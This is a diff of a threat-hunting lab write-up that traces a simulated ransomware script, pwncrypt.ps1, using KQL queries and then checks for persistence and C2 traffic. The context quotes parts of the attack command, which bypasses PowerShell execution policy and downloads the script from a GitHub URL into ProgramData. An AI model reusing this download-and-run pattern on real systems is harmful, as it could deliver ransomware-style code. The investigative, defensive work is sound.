@@ -69,6 +69,7 @@ I next checked the DeviceProcessEvents table in order to determine how the files
     - The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `),
     - then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`)
     - and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
+
 **Query used to locate event:**
 
 ```kql
@@ -92,6 +93,7 @@ The initiating process account for the execution of `pwncrypt.ps1` was `SYSTEM`,
 ### 5: Checked for Malicious Persistence Mechanisms
 
 I ran a query to determine whether any malicious persistence mechanisms were installed on the system (e.g., via schtasks or sc.exe). The results showed several instances of sc.exe, but all were related to legitimate service starts such as the Windows Time Service. No evidence of malicious scheduled tasks or services was found.
+
 **Query used to locate event:**
 ```kql
 DeviceProcessEvents
@@ -105,6 +107,7 @@ DeviceProcessEvents
 ### 6: Investigated Network Traffic for C2 Communication
 
 I ran a query to check for any suspicious or malicious traffic coming from the target machine that could indicate communication with a Command and Control (C2) server. No suspicious traffic was detected.
+
 **Query used to locate event:**
 ```kql
 DeviceNetworkEvents
